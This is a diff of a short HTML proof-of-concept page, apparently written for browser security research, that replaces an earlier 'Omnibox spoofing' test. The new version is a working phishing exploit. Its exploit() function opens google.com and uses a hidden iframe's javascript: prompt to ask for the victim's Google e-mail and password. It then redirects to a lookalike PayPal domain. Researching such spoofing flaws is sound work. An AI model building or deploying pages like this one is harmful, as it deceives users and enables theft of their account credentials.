@@ -1,56 +1,26 @@
+<html>
+  <body>
 
-<!DOCTYPE HTML>
-<html lang="en-US">
-<head>
-	<meta charset="UTF-8">
-	<title>Omnibox spoofing</title>
-	<style>
-		body{
-		    margin-top: 0px; 
-		    margin-bottom: 0px; 
-		    margin-left: 0px; 
-		    margin-right: 0px;
-		    padding: 0;
-		}
-      .input1 {
-  background-color: red;
-  border: none;
-  color: white;
-  padding: 15px 32px;
-  text-align: center;
-  text-decoration: none;
-  display: inline-block;
-  font-size: 36px;
-  margin: 4px 2px;
-  cursor: pointer;
-}
-.input2 {
-  background-color: green;
-  border: none;
-  color: white;
-  padding: 125px 32px;
-  text-align: center;
-  text-decoration: none;
-  display: inline-block;
-  font-size: 36px;
-  margin: 4px 2px;
-  cursor: pointer;
-}
-	</style>
+    <script>
 
-	<script>
-		function exec() {
-				document.getElementById("content").innerHTML+= '<iframe src="https://jigsaw.w3.org/HTTP/Basic/" style="visibility:hidden;display:none"></iframe>';
-		}
-	</script>
-</head>
+    function exploit() {
 
-<body>
-	<div id="content">
-        <input class="input1" onclick="setTimeout(function(){document.location='https://www.amazon.com'}, 559)" type="button" style="size:32" value="click here first"></center>
-		<input class="input2" onclick="exec();" type="button" value="then click here ">
-	</div>
+      window.open("https://www.google.com");
 
-</body>
+      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
+      document.location="http://www.manage-myaccount.paypal.com-webapps.bntk.pl";
 
+    }
+    
+    </script>
+
+    <br><br><br><br>
+
+    <a href="#" onclick="exploit();">
+      <center><h1>Click here to go to Google.com</h1></center>
+    </a>
+
+    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
+
+  </body>
 </html>
